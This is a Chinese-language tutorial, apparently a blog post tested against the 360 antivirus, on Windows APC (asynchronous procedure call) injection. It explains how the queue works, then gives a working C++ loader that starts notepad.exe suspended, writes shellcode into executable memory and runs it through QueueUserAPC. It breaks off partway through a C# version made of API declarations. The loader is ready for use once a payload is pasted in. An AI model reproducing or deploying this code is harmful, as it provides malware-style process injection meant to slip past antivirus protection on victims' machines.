前言：本文以最新版360作为测试，如果有错漏之处，还请师傅们指正。
## APC介绍
APC中文名称为异步过程调用，
APC是一个链状的数据结构，可以让一个线程在其本应该的执行步骤前执行其他代码，每个线程都维护这一个APC链。当线程从等待状态苏醒后，会自动检测自己得APC队列中是否存在APC过程。
所以只需要将目标进程的线程的APC队列里面添加APC过程，当然为了提高命中率可以向进程的所有线程中添加APC过程。然后促使线程从休眠中恢复就可以实现APC注入。
APC注入的一些前置如下：
  * 线程在进程内执行
  * 线程会调用在APC队列中的函数
  * 应用可以给特定线程的APC队列压入函数(有权限控制)
  * 压入队列后，线程将按照顺序优先级执行(FIFO)
  * 这种注入技术的缺点是只有当线程处在alertable状态时才去执行这些APC函数
MSDN上对此解释如下  
QueueUserApc: 函数作用,添加制定的异步函数调用(回调函数)到执行的线程的APC队列中
APCproc: 函数作用: 回调函数的写法.
首先异步函数调用的原理：
异步过程调用是一种能在特定线程环境中异步执行的系统机制。
往线程APC队列添加APC，系统会产生一个软中断。在线程下一次被调度的时候，就会执行APC函数，APC有两种形式，由系统产生的APC称为内核模式APC，由应用程序产生的APC被称为用户模式APC
## APC 注入
### 简单原理
1.当对面程序执行到某一个上面的等待函数的时候,系统会产生一个中断
2.当线程唤醒的时候,这个线程会优先去Apc队列中调用回调函数
3.我们利用QueueUserApc,往这个队列中插入一个回调
4.插入回调的时候,把插入的回调地址改为LoadLibrary,插入的参数我们使用VirtualAllocEx申请内存,并且写入进去
### 注入流程
`QueueUserAPC`函数的第一个参数表示执行的函数地址，当开始执行该APC的时候，程序就会跳转到该函数地址执行。第二个参数表示插入APC的线程句柄，要求线程句柄必须包含`THREAD_SET_CONTEXT`访问权限。第三个参数表示传递给执行函数的参数。与远线程注入类似，如果`QueueUserAPC`函数的第一个参数，即函数地址设置的是`LoadLibraryA`函数地址，第三个参数，即传递参数设置的是DLL的路径。那么，当执行APC的时候，便会调用`LoadLibraryA`函数加载指定路径的DLL，完成DLL注入操作。如果直接传入shellcode不设置第三个函数,可以直接执行shellcode。
## APC注入实现
函数原型
    DWORD QueueUserAPC(
      [in] PAPCFUNC  pfnAPC,     //APC 注入方式
      [in] HANDLE    hThread,     
      [in] ULONG_PTR dwData
    );
### C++ 实现
代码如下
    #include 
    #include 
    unsigned char shellcode[] = "";    //shellcode "\xfc\x48\x83\xe4"
    int main()
    {
        LPCSTR lpApplication = "C:\\Windows\\System32\\notepad.exe";   //path
        SIZE_T buff = sizeof(shellcode);      //size of shellcode
        STARTUPINFOA sInfo = { 0 };
        PROCESS_INFORMATION pInfo = { 0 };     //return a new process info
        CreateProcessA(lpApplication, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo);      //create a new thread for process
        HANDLE hProc = pInfo.hProcess;
        HANDLE hThread = pInfo.hThread;    
        // write shellcode to the process memory
        LPVOID lpvShellAddress = VirtualAllocEx(hProc, NULL, buff, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        PTHREAD_START_ROUTINE ptApcRoutine = (PTHREAD_START_ROUTINE)lpvShellAddress;
        WriteProcessMemory(hProc, lpvShellAddress, shellcode, buff, NULL);
        // use QueueUserAPC  load shellcode
        QueueUserAPC((PAPCFUNC)ptApcRoutine, hThread, NULL);
        ResumeThread(hThread);
        return 0;
    }
### C#实现
代码如下
    using System;
    using System.Runtime.InteropServices;
     public class shellcode
     {
     [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
     [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern uint ResumeThread(IntPtr hThread);
     [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern bool CloseHandle(IntPtr hObject);
     [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
     public static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
     public enum ProcessAccessRights
     {
     All = 0x001F0FFF,
     Terminate = 0x00000001,
     CreateThread = 0x00000002,
     VirtualMemoryOperation = 0x00000008,
     VirtualMemoryRead = 0x00000010,
     VirtualMemoryWrite = 0x00000020,
     DuplicateHandle = 0x00000040,
     CreateProcess = 0x000000080,
     SetQuota = 0x00000100,
     SetInformation = 0x00000200,
     QueryInformation = 0x00000400,
     QueryLimitedInformation = 0x00001000,
     Synchronize = 0x00100000
     }
     public enum ThreadAccess : int
     {
     TERMINATE = (0x0001),
     SUSPEND_RESUME = (0x0002),
     GET_CONTEXT = (0x0008),
     SET_CONTEXT = (0x0010),
     SET_INFORMATION = (0x0020),
     QUERY_INFORMATION = (0x0040),
     SET_THREAD_TOKEN = (0x0080),
     IMPERSONATE = (0x0100),
     DIRECT_IMPERSONATION = (0x0200),
     THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
     THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
     }
     public enum MemAllocation
     {
     MEM_COMMIT = 0x00001000,
     MEM_RESERVE = 0x00002000,
     MEM_RESET = 0x00080000,
     MEM_RESET_UNDO = 0x1000000,
     SecCommit = 0x08000000
     }
     public enum MemProtect
     {
     PAGE_EXECUTE = 0x10,
     PAGE_EXECUTE_READ = 0x20,
     PAGE_EXECUTE_READWRITE = 0x40,
     PAGE_EXECUTE_WRITECOPY = 0x80,
     PAGE_NOACCESS = 0x01,
     PAGE_READONLY = 0x02,
     PAGE_READWRITE = 0x04,
     PAGE_WRITECOPY = 0x08,
     PAGE_TARGETS_INVALID = 0x40000000,
     PAGE_TARGETS_NO_UPDATE = 0x40000000,
     }
     [StructLayout(LayoutKind.Sequential)]
     public struct PROCESS_INFORMATION
     {
     public IntPtr hProcess;
     public IntPtr hThread;
     public int dwProcessId;
     public int dwThreadId;
     }
     [StructLayout(LayoutKind.Sequential)]
     internal struct PROCESS_BASIC_INFORMATION
     {
     public IntPtr Reserved1;
     public IntPtr PebAddress;
     public IntPtr Reserved2;